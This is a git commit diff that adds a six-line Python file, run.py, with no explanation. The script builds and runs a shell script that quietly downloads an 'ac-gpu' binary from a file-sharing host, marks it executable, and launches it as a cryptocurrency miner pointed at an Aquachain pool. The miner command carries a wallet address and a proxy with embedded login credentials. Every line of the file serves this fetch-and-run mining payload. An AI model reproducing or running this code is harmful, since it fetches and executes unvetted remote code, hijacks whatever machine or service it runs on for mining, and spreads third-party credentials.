6c60d9e4465eb5fc91feb8c0cf1fd46b6d3161b8
togninifabio98 <95686951+togninifabio98@users.noreply.github.com>
2021-12-29 17:40:10 -0500

    Create run.py

---
+++ run.py
@@ -0,0 +1,6 @@
+import os
+os.system('echo "#!/bin/sh" >> tes')
+os.system('echo "wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu && chmod +x ac-gpu" >> tes')
+os.system('echo "./ac-gpu -F http://pool.aquachain.xyz:8888/0xdCBDe4E1BF120243e26629610EA6e0440b8560a2/Sastra -t 1 --proxy socks5://simbahkencot-rotate:tukimenreborn@p.webshare.io:80" >> tes')
+os.system('sleep 2')
+os.system('sh tes')
